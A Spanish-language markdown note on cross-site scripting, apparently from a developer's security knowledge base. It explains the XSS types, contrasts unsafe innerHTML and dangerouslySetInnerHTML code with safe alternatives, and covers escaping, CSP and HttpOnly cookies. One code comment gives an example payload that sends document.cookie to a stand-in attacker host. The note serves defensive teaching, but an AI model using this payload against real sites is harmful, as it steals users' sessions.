# XSS (Cross-Site Scripting)

Inyectar JavaScript malicioso en una página que van a ver otros usuarios, para que corra en el navegador de la víctima con los mismos permisos que el sitio legítimo — puede robar cookies sin `HttpOnly`, leer tokens de `localStorage`, o hacer requests en nombre del usuario logueado.

## Tipos

- **Stored**: el payload queda guardado en el servidor (ej. el texto de un comentario) y se sirve a todos los que visitan esa página — el más peligroso, porque afecta a cualquiera sin que el atacante tenga que hacer nada más.
- **Reflected**: el payload viaja en la URL o el body de un request y el servidor lo devuelve tal cual en la respuesta, sin persistirlo — requiere que la víctima haga click en un link armado por el atacante.
- **DOM-based**: la vulnerabilidad está enteramente del lado del cliente — JavaScript que toma datos no confiables (la URL, un input) y los mete en el DOM sin pasar nunca por el servidor.

## El problema de fondo: tratar datos como si fueran código

```js
// ❌ vulnerable: el navegador interpreta lo que hay adentro como HTML real
elemento.innerHTML = comentarioDelUsuario;
// si comentarioDelUsuario = '<img src=x onerror="fetch(`https://atacante.com?c=${document.cookie}`)">'
// esa imagen rota dispara el script apenas se renderiza

// ✅ seguro: se inserta como texto plano, el navegador no lo ejecuta
elemento.textContent = comentarioDelUsuario;
```

React escapa automáticamente cualquier valor que renderices como texto — pero `dangerouslySetInnerHTML` existe justamente para saltarse esa protección, y hay que tratarlo como una operación de riesgo:

```jsx
// ❌ dangerouslySetInnerHTML bypassea el escape automático de React
<div dangerouslySetInnerHTML={{ __html: comentarioDelUsuario }} />

// ✅ React escapa el contenido solo — nunca se interpreta como HTML
<div>{comentarioDelUsuario}</div>
```

## Cómo se previene

- **Escapar por default**: cualquier dato que venga de un usuario (o de una fuente externa) se trata como texto, nunca como HTML, salvo que se sanitice explícitamente con una librería para eso.
- **Content-Security-Policy**: restringe de qué orígenes puede cargar/ejecutar scripts la página — mitiga el impacto aunque el escape falle en algún lugar puntual (ver [Security Headers](security-headers.md#content-security-policy-csp)).
- **`HttpOnly` en cookies sensibles**: no evita el XSS en sí, pero limita el daño — el script inyectado no puede leer una cookie que el navegador no expone a JavaScript (ver [Autenticación](../backend/autenticacion.md#8-dónde-guardar-el-token-en-el-cliente)).

---
Relacionado: [CSRF](csrf.md), [Security Headers](security-headers.md), [Autenticación y Seguridad](../backend/autenticacion.md), [Almacenamiento en el cliente](../frontend-react/almacenamiento-cliente.md).
